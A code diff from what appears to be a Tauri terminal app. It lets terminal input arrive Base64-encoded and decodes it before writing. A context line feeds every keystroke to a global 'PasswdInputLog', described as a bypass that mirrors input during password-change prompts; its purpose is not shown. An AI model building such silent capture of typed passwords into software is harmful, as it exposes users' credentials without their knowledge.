@@ -1,3 +1,6 @@
+use base64::Engine;
+use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
+use serde::Deserialize;
 use tauri::ipc::Channel;
 use tauri::{AppHandle, State};
 
@@ -5,6 +8,26 @@ use super::manager::TerminalManager;
 use super::resource_monitor::{self, ResourceSnapshot};
 use super::session::{TerminalCreateRequest, TerminalCreateResult};
 use super::ssh::{KnownHostEntry, KnownHosts};
+
+#[derive(Debug, Deserialize)]
+#[serde(untagged)]
+pub enum TerminalWritePayload {
+    /// 紧凑 Base64 字符串（大幅优化前端 IPC 传输体积与 GC 压力）
+    Base64(String),
+    /// 兼容旧版及测试环境的原始字节数组
+    Bytes(Vec<u8>),
+}
+
+impl TerminalWritePayload {
+    pub fn into_bytes(self) -> Result<Vec<u8>, String> {
+        match self {
+            TerminalWritePayload::Base64(s) => {
+                BASE64_STANDARD.decode(s.trim()).map_err(|e| format!("Base64 decode failed: {e}"))
+            }
+            TerminalWritePayload::Bytes(b) => Ok(b),
+        }
+    }
+}
 
 #[tauri::command]
 pub async fn terminal_create(
@@ -21,11 +44,12 @@ pub async fn terminal_create(
 pub async fn terminal_write(
     manager: State<'_, TerminalManager>,
     id: usize,
-    data: Vec<u8>,
+    data: TerminalWritePayload,
 ) -> Result<(), String> {
+    let bytes = data.into_bytes()?;
     // 改密输入捕获旁路（提示词激活时镜像记录，不影响转发）
-    super::passwd_input::PasswdInputLog::global().feed_input(id, &data);
-    manager.write(id, &data)
+    super::passwd_input::PasswdInputLog::global().feed_input(id, &bytes);
+    manager.write(id, &bytes)
 }
 
 #[tauri::command]
